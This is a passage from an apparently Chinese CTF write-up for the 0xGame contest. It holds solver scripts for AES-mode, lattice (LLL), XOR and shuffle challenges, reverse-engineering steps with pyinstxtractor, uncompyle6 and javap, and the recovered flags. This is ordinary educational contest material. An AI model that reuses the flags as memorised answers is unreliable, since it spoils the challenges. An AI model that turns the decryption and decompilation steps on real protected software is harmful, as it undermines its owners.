formulas:&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Given C1||C2||C3 from temporary encryption:&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;P3_correct = P1 ⊕ IV ⊕ C2&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;P2&#x27; = P1 ⊕ IV ⊕ C1&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nC-B-C plaintext: P1 || P2 || P3_correct&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;C-C-B plaintext: P1 || P2&#x27; || P2&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nUse the formulas above to calculate manually&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>运行上述脚本，它会告诉你应该怎么做，首先选项1把<code>AAAAAAAAAAAAAAAAAAAAAP////////////////////8AAAAAAAAAAAAAAAAAAAAA==</code>这个粘进去，注意是base64编码的，所以记得结尾要有<code>==</code>,没有记得补上。然后服务器会返回给你加密的内容，粘进脚本里，<code>Ug7WsyG0J3FNWii4QRq2HQBI5mgU27sArYBi5lVTcR06+3+4x5Tdy5Ec9yMH2Xva</code>,然后它会给你解出cbc：<code>AAAAAAAAAAAAAAAAAAAAAP////////////////////8yAtWc9JDrDqkBCH3vRPBv</code>和ccb：<code>AAAAAAAAAAAAAAAAAAAAAGBE5UfB/3d/SdtCI/sNN2//////////////////////</code>,从而得到flag：<code> 0xGame&#123;fdc902c6-873a-4d92-b366-b6e83bde39f7&#125;</code>.</p>\n<h2 id=\"格\"><a href=\"#格\" class=\"headerlink\" title=\"格\"></a>格</h2><p>解格：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># SageMath 代码 (最终版)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1. 这是你从程序输出中提供的矩阵</span></span><br><span class=\"line\">matrix_data = [</span><br><span class=\"line\">    [<span class=\"number\">3284681750909390818306909313921642175535822995982583393933696966300433498618099</span>, <span class=\"number\">7062920994008607414635543198964747262695143293079919687270285360471612225464116</span>, <span class=\"number\">9826330432780730699882966183005563282601785988437488502794820428794464309726364</span>, <span class=\"number\">10313939243981504072492843197821189873801981624046806578030558315476228320733359</span>],</span><br><span class=\"line\">    [<span class=\"number\">14962120076283198553291772690327243603574931151327631953834236409697046371251172</span>, <span class=\"number\">10914614871335511269514555072571377171094477247162595307427654861209446389077850</span>, <span class=\"number\">13813513556033584840229315973248340868169094377335326963200609716900171410846991</span>, <span class=\"number\">17767016205042422794681474520318417767408504251129953471000646286235093083687535</span>],</span><br><span class=\"line\">    [<span class=\"number\">15880849953718488589631767682500857705255547835146769369286551172642086223544654</span>, <span class=\"number\">23536981063518946472925309088916542857554725764823718161707669971432320275459487</span>, <span class=\"number\">26927812823530065718296292087211430992875944789365872721297497760084580766210537</span>, <span class=\"number\">22230074134750723773334677934743831896859185125095203873930495218095676602198247</span>],</span><br><span class=\"line\">    [<span class=\"number\">14741023566046737527403024490343979553759831564949552088348125025359384680249250</span>, <span class=\"number\">8837391869363988214859613817767621920507231139048698235441315423135328237787325</span>, <span class=\"number\">9720795972355554118334542488724936259246227879278497862252939659284272861952841</span>, <span class=\"number\">12075839868445672238363457714940958060191660916729079502656993881392627251511248</span>]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">M = matrix(ZZ, matrix_data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 2. 应用 LLL 算法. &#x27;B&#x27; 将是一个完整的 4x4 矩阵.</span></span><br><span class=\"line\">B = M.LLL()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] LLL 规约后的基 (完整的 B 矩阵):&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(B)</span><br><span class=\"line\"></span><br><span class=\"line\">found_secret = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">recover_secret</span>(<span class=\"params\">vector, vector_name</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> found_secret</span><br><span class=\"line\">    <span class=\"keyword\">if</span> found_secret: <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n--- 正在检查向量: <span class=\"subst\">&#123;vector_name&#125;</span> ---&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> direction <span class=\"keyword\">in</span> [<span class=\"number\">1</span>, -<span class=\"number\">1</span>]:</span><br><span class=\"line\">        v_cand = vector * direction</span><br><span class=\"line\">        <span class=\"keyword\">if</span> v_cand.is_zero(): <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">        first_nonzero_val = <span class=\"built_in\">next</span>((val <span class=\"keyword\">for</span> val <span class=\"keyword\">in</span> v_cand <span class=\"keyword\">if</span> val != <span class=\"number\">0</span>), <span class=\"literal\">None</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> byte_val <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">256</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> first_nonzero_val % byte_val == <span class=\"number\">0</span>:</span><br><span class=\"line\">                k = first_nonzero_val // byte_val</span><br><span class=\"line\">                <span class=\"keyword\">if</span> k == <span class=\"number\">0</span>: <span class=\"keyword\">continue</span></span><br><span class=\"line\">                s_cand = v_cand / k</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"built_in\">all</span>(c.is_integer() <span class=\"keyword\">and</span> <span class=\"number\">0</span> &lt;= c &lt;= <span class=\"number\">255</span> <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> s_cand):</span><br><span class=\"line\">                    secret_bytes = <span class=\"built_in\">bytes</span>([<span class=\"built_in\">int</span>(c) <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> s_cand])</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] 成功! 在 &#x27;<span class=\"subst\">&#123;vector_name&#125;</span>&#x27; 中找到可能的 secret&quot;</span>)</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[-] secret: <span class=\"subst\">&#123;secret_bytes.<span class=\"built_in\">hex</span>()&#125;</span>&quot;</span>)</span><br><span class=\"line\">                    found_secret = <span class=\"literal\">True</span></span><br><span class=\"line\">                    <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 3. 检查基向量及其简单组合</span></span><br><span class=\"line\">candidates = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;B[0]&quot;</span>: B[<span class=\"number\">0</span>], <span class=\"string\">&quot;B[1]&quot;</span>: B[<span class=\"number\">1</span>],</span><br><span class=\"line\">    <span class=\"string\">&quot;B[0] + B[1]&quot;</span>: B[<span class=\"number\">0</span>] + B[<span class=\"number\">1</span>], <span class=\"string\">&quot;B[0] - B[1]&quot;</span>: B[<span class=\"number\">0</span>] - B[<span class=\"number\">1</span>],</span><br><span class=\"line\">    <span class=\"string\">&quot;B[2]&quot;</span>: B[<span class=\"number\">2</span>], <span class=\"string\">&quot;B[3]&quot;</span>: B[<span class=\"number\">3</span>]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> name, vec <span class=\"keyword\">in</span> candidates.items():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> found_secret: <span class=\"keyword\">break</span></span><br><span class=\"line\">    recover_secret(vec, name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> found_secret:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[!] 未能恢复 secret. 问题可能比预想的更复杂.&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>解密flag：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.Padding <span class=\"keyword\">import</span> unpad</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1. PEGA AQUÍ EL TEXTO CIFRADO COMPLETO DE 160 CARACTERES.</span></span><br><span class=\"line\"><span class=\"comment\">#    El que proporcionaste tiene 156 caracteres (78 bytes), le faltan 4 caracteres (2 bytes) al final.</span></span><br><span class=\"line\"><span class=\"comment\">#    Asegúrate de copiarlo entero.</span></span><br><span class=\"line\">hex_ciphertext = <span class=\"string\">&quot;83c9b4db1e036eada862d24928ae12641f7e56f713598661600da434cf3bc3e74429cbb807173626516dd030d964ad1f06ef2f9da03722943ba57653c4e0733b8474d57d450b01a331b1bd7ea36dcc4b&quot;</span> <span class=\"comment\"># &lt;--- ¡REEMPLAZA ESTO CON EL VALOR COMPLETO!</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 2. La clave fija del programa.</span></span><br><span class=\"line\">key = <span class=\"string\">b&#x27;0xGame2025awaQAQ&#x27;</span></span><br><span class=\"line\">block_size = AES.block_size  <span class=\"comment\"># 16 bytes</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># --- Script de Desencriptación Correcto ---</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    full_ciphertext = <span class=\"built_in\">bytes</span>.fromhex(hex_ciphertext)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># Comprobación de la longitud</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(full_ciphertext) % block_size != <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[!] ADVERTENCIA: La longitud del texto cifrado (<span class=\"subst\">&#123;<span class=\"built_in\">len</span>(full_ciphertext)&#125;</span> bytes) no es un múltiplo de 16.&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[!] Esto indica que el texto cifrado está incompleto. El resultado será incorrecto.&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(full_ciphertext) &lt; block_size:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> ValueError(<span class=\"string\">&quot;El texto cifrado es demasiado corto.&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># El primer bloque del texto cifrado (C_1) actúa como el IV para descifrar el resto del mensaje.</span></span><br><span class=\"line\">    iv_for_decryption = full_ciphertext[<span class=\"number\">0</span>:block_size]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># El texto cifrado que queremos descifrar es todo lo que sigue al primer bloque (C_2, C_3, ...).</span></span><br><span class=\"line\">    ciphertext_to_decrypt = full_ciphertext[block_size:]</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># Crear un nuevo cifrador CFB usando C_1 como IV.</span></span><br><span class=\"line\">    cipher = AES.new(key, AES.MODE_CFB, iv=iv_for_decryption)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># Descifrar para obtener (padded_flag + urandom_final).</span></span><br><span class=\"line\">    decrypted_payload = cipher.decrypt(ciphertext_to_decrypt)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Contenido descifrado: <span class=\"subst\">&#123;decrypted_payload&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># El mensaje original era: padded_flag(48 bytes) + urandom(16 bytes).</span></span><br><span class=\"line\">    <span class=\"comment\"># Por lo tanto, el contenido descifrado debería tener 64 bytes.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(decrypted_payload) &lt; <span class=\"number\">48</span>: <span class=\"comment\"># Necesitamos al menos los 48 bytes de la flag.</span></span><br><span class=\"line\">         <span class=\"keyword\">raise</span> ValueError(<span class=\"string\">&quot;El contenido descifrado es demasiado corto para contener la flag.&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Aislamos los bloques que deberían contener la flag con padding (los primeros 48 bytes del payload).</span></span><br><span class=\"line\">    padded_flag = decrypted_payload[:<span class=\"number\">48</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Intentar quitar el padding de la parte de la flag.</span></span><br><span class=\"line\">    flag = unpad(padded_flag, block_size)</span><br><span class=\"line\">    </span><br><span class=\"line\">    flag_str = flag.decode()</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> flag_str.startswith(<span class=\"string\">&quot;0xGame&#123;&quot;</span>) <span class=\"keyword\">and</span> flag_str.endswith(<span class=\"string\">&quot;&#125;&quot;</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span> + <span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">40</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] ¡ÉXITO! La flag es: <span class=\"subst\">&#123;flag_str&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">40</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[!] Se descifró un texto, pero no parece tener el formato de la flag.&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[!] Texto obtenido: <span class=\"subst\">&#123;flag_str&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">except</span> (ValueError, IndexError) <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n[!] ERROR: No se pudo descifrar la flag. Causa probable: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[!] Por favor, comprueba que has copiado el texto cifrado completo (160 caracteres hexadecimales).&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n[!] Ocurrió un error inesperado: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>得到flag：<code>0xGame&#123;5adccb16-92b6-4d44-89dd-c1e39f6c9338&#125;</code></p>\n<h1 id=\"Osint\"><a href=\"#Osint\" class=\"headerlink\" title=\"Osint\"></a>Osint</h1><h2 id=\"机场\"><a href=\"#机场\" class=\"headerlink\" title=\"机场\"></a>机场</h2><p>根据橙黄色廊桥和西藏航空的飞机(Tibet Airlines)可以确定是<code>珠海金湾机场</code>，三字码是ZUH，注意这个是大写，然后用网站上的加密工具进行32位小写md5加密，得到<code>296d0dd1964288715beb8e2d06dca1a5</code>,就得到flag了。</p>\n<h1 id=\"Reverse\"><a href=\"#Reverse\" class=\"headerlink\" title=\"Reverse\"></a>Reverse</h1><h2 id=\"baby-python逆向\"><a href=\"#baby-python逆向\" class=\"headerlink\" title=\"baby_python逆向\"></a>baby_python逆向</h2><ul>\n<li><p>使用<code>pyinstxtractor</code>提取文件，运行<code>python pyinstxtractor.py babyPy.exe</code>，从.exe中提取.pyc文件(注意这个工具要和目标程序放在同一个目录下。)</p>\n</li>\n<li><p>使用<code>uncompyle6</code>反编译，<code>uncompyle6 babyPy.pyc &gt; decompiled_code.py</code>,然后就可以在<code>decompiled_code.py</code>这个脚本里找到flag了。</p>\n</li>\n<li><p><code>0xGame&#123;c2a6d59d-34dc-4b94-96aa-e823bdcb4823&#125;</code></p>\n</li>\n</ul>\n<h2 id=\"baby-java逆向\"><a href=\"#baby-java逆向\" class=\"headerlink\" title=\"baby_java逆向\"></a>baby_java逆向</h2><ul>\n<li><p><code>jar -tf BabyJar.jar</code>分析文件结构</p>\n</li>\n<li><pre><code class=\"language-python\"># 提取所有 class 文件\njar -xf BabyJar.jar\n\n# 使用 javap 查看字节码（基础信息）\njavap -c com/BabyJar/demo/BabyJar.class\njavap -c com/BabyJar/demo/Encrypt.class\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">​\t查看类的基础信息。</span><br><span class=\"line\"></span><br><span class=\"line\">- 找到密文`QsY1V5cX9jJyF2JSAgdikwfCEneTAgICUpNnd1Iyk8IXUkJ3QhcyZ8J3YpY=`   和   加密过程`原始flag → 每个字节 XOR 20 → 交换高低4位 → Base64编码 → 比较`</span><br><span class=\"line\"></span><br><span class=\"line\">- 解密：`Base64解码 → 交换高低4位 → 每个字节 XOR 20 → 得到原始flag`</span><br><span class=\"line\"></span><br><span class=\"line\">- 完整exp：</span><br><span class=\"line\"></span><br><span class=\"line\">  ```python</span><br><span class=\"line\">  import base64</span><br><span class=\"line\">  </span><br><span class=\"line\">  # 硬编码的密文</span><br><span class=\"line\">  encoded = &quot;QsY1V5cX9jJyF2JSAgdikwfCEneTAgICUpNnd1Iyk8IXUkJ3QhcyZ8J3YpY=&quot;</span><br><span class=\"line\">  </span><br><span class=\"line\">  # Base64 解码</span><br><span class=\"line\">  encrypted_bytes = base64.b64decode(encoded)</span><br><span class=\"line\">  </span><br><span class=\"line\">  # 逆向加密过程</span><br><span class=\"line\">  def decrypt(data):</span><br><span class=\"line\">      result = []</span><br><span class=\"line\">      for byte in data:</span><br><span class=\"line\">          # 1. 先交换高低4位（逆向第一步）</span><br><span class=\"line\">          swapped = ((byte &amp; 0x0F) &lt;&lt; 4) | ((byte &amp; 0xF0) &gt;&gt; 4)</span><br><span class=\"line\">          # 2. 再与 key=20 进行 XOR（逆向第二步）</span><br><span class=\"line\">          decrypted = swapped ^ 20</span><br><span class=\"line\">          result.append(decrypted)</span><br><span class=\"line\">      return bytes(result)</span><br><span class=\"line\">  </span><br><span class=\"line\">  # 解密</span><br><span class=\"line\">  decrypted = decrypt(encrypted_bytes)</span><br><span class=\"line\">  flag = decrypted.decode(&#x27;utf-8&#x27;)</span><br><span class=\"line\">  print(f&quot;Flag: &#123;flag&#125;&quot;)</span><br></pre></td></tr></table></figure>\n\n得到flag：`0xGame&#123;73e214d2-d85c-4441-bc17-8e10c0e7b8c2&#125;`.\n</code></pre>\n</li>\n</ul>\n<h2 id=\"16位程序与asm汇编\"><a href=\"#16位程序与asm汇编\" class=\"headerlink\" title=\"16位程序与asm汇编\"></a>16位程序与asm汇编</h2><p>数据分两个循环两种加密。每23个字节为一段。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 完整加密数据</span></span><br><span class=\"line\">encrypted = [</span><br><span class=\"line\">    <span class=\"number\">0x47</span>, <span class=\"number\">0x7F</span>, <span class=\"number\">0x52</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x7E</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0x47</span>, <span class=\"number\">0x47</span>,</span><br><span class=\"line\">    <span class=\"number\">0x73</span>, <span class=\"number\">0x5A</span>, <span class=\"number\">0x84</span>, <span class=\"number\">0x5A</span>, <span class=\"number\">0x43</span>, <span class=\"number\">0x85</span>, <span class=\"number\">0x46</span>, <span class=\"number\">0x5A</span>, <span class=\"number\">0x83</span>, <span class=\"number\">0x6F</span>,</span><br><span class=\"line\">    <span class=\"number\">0x46</span>, <span class=\"number\">0x5A</span>, <span class=\"number\">0x6C</span>,  <span class=\"comment\"># 前23字节</span></span><br><span class=\"line\">    <span class=\"number\">0x33</span>, <span class=\"number\">0x30</span>, <span class=\"number\">0x73</span>, <span class=\"number\">0x32</span>, <span class=\"number\">0x75</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0x37</span>, <span class=\"number\">0x61</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0x33</span>,</span><br><span class=\"line\">    <span class=\"number\">0x30</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x35</span>, <span class=\"number\">0x61</span>, <span class=\"number\">0x4E</span>, <span class=\"number\">0x64</span>, <span class=\"number\">0x34</span>, <span class=\"number\">0x65</span>,</span><br><span class=\"line\">    <span class=\"number\">0x32</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0x88</span>   <span class=\"comment\"># 后23字节</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 分开两部分</span></span><br><span class=\"line\">part1 = encrypted[:<span class=\"number\">23</span>]  <span class=\"comment\"># 循环1处理</span></span><br><span class=\"line\">part2 = encrypted[<span class=\"number\">23</span>:]  <span class=\"comment\"># 循环2处理</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法1：先sub 9再xor 0E (循环1)</span></span><br><span class=\"line\">decrypted1 = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> byte <span class=\"keyword\">in</span> part1:</span><br><span class=\"line\">    decrypted1 += <span class=\"built_in\">chr</span>(((byte - <span class=\"number\">9</span>) &amp; <span class=\"number\">0xFF</span>) ^ <span class=\"number\">0x0E</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法2：先xor 0E再sub 9 (循环2)  </span></span><br><span class=\"line\">decrypted2 = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> byte <span class=\"keyword\">in</span> part2:</span><br><span class=\"line\">    decrypted2 += <span class=\"built_in\">chr</span>(((byte ^ <span class=\"number\">0x0E</span>) - <span class=\"number\">9</span>) &amp; <span class=\"number\">0xFF</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;第一部分:&quot;</span>, decrypted1)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;第二部分:&quot;</span>, decrypted2)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;完整Flag:&quot;</span>, decrypted1 + decrypted2)</span><br></pre></td></tr></table></figure>\n\n<p>逆向解密，得到：<code>0xGame&#123;g00d_u_4r3_th3_m45t3r_0f_45m_E2f7a1b34&#125;</code></p>\n<p>很好，你是汇编大师🥰🥰。</p>\n<h2 id=\"shuffle\"><a href=\"#shuffle\" class=\"headerlink\" title=\"shuffle\"></a>shuffle</h2><p>IDA里可以看到打乱的flag：<code>23-64bed6&#125;-xm5300-&#123;faGa34-0e04c2e7c2a78f39a4</code>,随机数种子1638，MSVC的标准C语言库生成的随机数，和打乱逻辑:</p>\n<p><img src=\"/images/wp/shuffle.png\" alt=\"shuffle\"></p>\n<p>编写逆向脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> idx <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(operations) - <span class=\"number\">1</span>, -<span class=\"number\">1</span>, -<span class=\"number\">1</span>):</span><br><span class=\"line\">       i, swap_idx = operations[idx]</span><br><span class=\"line\">       arr[i], arr[swap_idx] = arr[swap_idx], arr[i]</span><br><span class=\"line\">   </span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;</span>.join(arr)</span><br><span 